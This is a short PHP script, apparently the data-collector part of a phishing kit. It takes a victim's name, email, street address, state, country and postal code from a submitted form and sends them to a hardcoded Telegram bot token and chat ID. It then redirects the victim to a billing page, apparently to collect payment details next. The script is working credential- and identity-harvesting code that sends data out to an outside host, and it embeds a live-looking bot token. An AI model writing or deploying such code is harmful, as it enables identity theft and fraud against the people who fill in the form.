<?php
 $token="5912247911:AAF5D53I7Q89_juB6I-Je9jJMoC5ENYgKD0";

//getting input from post method 
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the form values
    $username = $_POST['username'] ?? '';
    $email = $_POST['email'] ?? '';
    $address = $_POST['address'] ?? '';
    $firstname = $_POST['firstname'] ?? '';
    $lastname = $_POST['lastname'] ?? '';
    $phonephone = $_POST['phone'] ?? '';
    $address = $_POST['address'] ?? '';
    $address2 = $_POST['address2'] ?? '';
    $state = $_POST['state'] ?? '';
    $country = $_POST['country'] ?? '';
    $post = $_POST['post'] ?? '';
    $area = $_POST['area'] ?? '';

};

/////macinize

$message = "Fristname: $firstname\nLastname: $lastname\nEmail: $email\nStreet Address: $address\nStreet Address 2: $address2\nState: $state\nCountry: $country\nPostal code: $post\nArea: $area " ;
$data = [
 'text' => $message,
 'chat_id' => '1352942997'
];

$hmm = file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?" .http_build_query($data));


header("Location: /billing.php"); 

?>
